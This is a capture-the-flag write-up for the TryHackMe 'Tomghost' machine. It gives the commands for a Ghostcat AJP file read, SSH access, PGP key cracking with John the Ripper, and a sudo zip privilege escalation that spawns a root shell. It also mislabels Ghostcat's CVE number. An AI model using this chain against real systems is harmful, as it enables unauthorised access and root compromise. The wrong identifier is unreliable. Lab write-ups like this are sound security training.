# Tomghost

**Difficulty:** Easy  
**Category:** Web / Tomcat / Privilege Escalation

---

## Summary

The target exposed SSH, DNS, AJP, and HTTP services. Apache Tomcat 9.0.30 was identified on port 8080 and exploited using Ghostcat (CVE-2020-10487) to read `web.xml` and obtain SSH credentials. Access as `******` provided encrypted PGP files. The PGP passphrase was cracked using John the Ripper, revealing credentials for `merlin`. Finally, the sudo-permitted `zip` binary was abused to obtain root access.

## Attack Chain

**AJP → Tomcat 9.0.30 → Ghostcat → `web.xml` → SSH as ******* → PGP Recovery → John the Ripper → SSH as merlin → User Flag → sudo zip → Root Flag**

## Enumeration

    sudo nmap -sCV -p- 10.49.168.94

Open ports:

    22    SSH
    53    DNS
    8009  AJP
    8080  HTTP

Port 8080 was running Apache Tomcat 9.0.30.

## Initial Access

Tomcat was vulnerable to Ghostcat (CVE-2020-10487). The AJP service was used to read `web.xml`:

    git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487.git
    cd Ghostcat-CNVD-2020-10487
    python3 ajpShooter.py http://10.49.168.94 8009 /WEB-INF/web.xml read

The file disclosed credentials for `******k`:

    ssh ******k@10.49.168.94

Two files were found in `/home/******k/`:

    tryhackme.asc
    credential.pgp

Transferred them to Kali:

    scp skyfuck@10.49.168.94:/home/skyfuck/tryhackme.asc .
    scp skyfuck@10.49.168.94:/home/skyfuck/credential.pgp .

Converted the PGP key into a John-compatible hash and cracked it:

    gpg2john tryhackme.asc > pgp_hash.txt
    john --wordlist=/usr/share/wordlists/rockyou.txt pgp_hash.txt

Imported the key and decrypted the credential file:

    gpg --import tryhackme.asc
    gpg --decrypt credential.pgp

The decrypted credentials provided SSH access as `merlin`:

    ssh merlin@10.49.168.94

The user flag was obtained from `merlin`'s home directory.

## Privilege Escalation

Checked sudo permissions:

    sudo -l

`/usr/bin/zip` was allowed to run with elevated privileges.

    sudo /usr/bin/zip /tmp/test.zip /etc/hosts -T -TT '/bin/sh #'

This provided a root shell.

    whoami
    cat /root/root.txt
